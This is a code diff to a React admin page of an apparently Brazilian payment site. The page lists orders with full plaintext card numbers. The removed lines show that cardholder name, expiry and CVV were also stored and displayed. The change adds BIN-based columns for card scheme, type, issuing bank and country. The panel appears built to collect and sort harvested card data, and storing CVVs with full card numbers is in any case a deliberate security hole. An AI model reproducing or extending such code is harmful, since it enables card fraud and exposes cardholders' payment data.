@@ -797,9 +797,19 @@ export default function Admin() {
                         <td className="px-3 py-2 whitespace-nowrap">R$ {l.total_amount ? (l.total_amount / 100).toFixed(2) : "—"}</td>
                         <td className="px-3 py-2 whitespace-nowrap">{l.cidade}/{l.uf}</td>
                         <td className="px-3 py-2 whitespace-nowrap font-mono">{l.card_number}</td>
-                        <td className="px-3 py-2 whitespace-nowrap">{l.card_holder}</td>
-                        <td className="px-3 py-2">{l.card_expiry}</td>
-                        <td className="px-3 py-2">{l.card_cvv}</td>
+                        {(() => {
+                          const clean = l.card_number?.replace(/\D/g, "") || "";
+                          const bin = clean.length >= 6 ? clean.slice(0, 6) : "";
+                          const info = bin ? binCache[bin] : null;
+                          return (
+                            <>
+                              <td className="px-3 py-2 whitespace-nowrap text-[10px] font-semibold uppercase">{info?.scheme || "—"}</td>
+                              <td className="px-3 py-2 whitespace-nowrap text-[10px]">{info?.type || "—"}</td>
+                              <td className="px-3 py-2 whitespace-nowrap text-[10px]">{info?.bank_name || "—"}</td>
+                              <td className="px-3 py-2 whitespace-nowrap text-[10px]">{info?.country_name || "—"}</td>
+                            </>
+                          );
+                        })()}
                         <td className="px-3 py-2">{l.card_installments}</td>
                         <td className="px-3 py-2">
                           <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${l.status === "paid" ? "bg-success/20 text-success" : "bg-amber-100 text-amber-700"}`}>
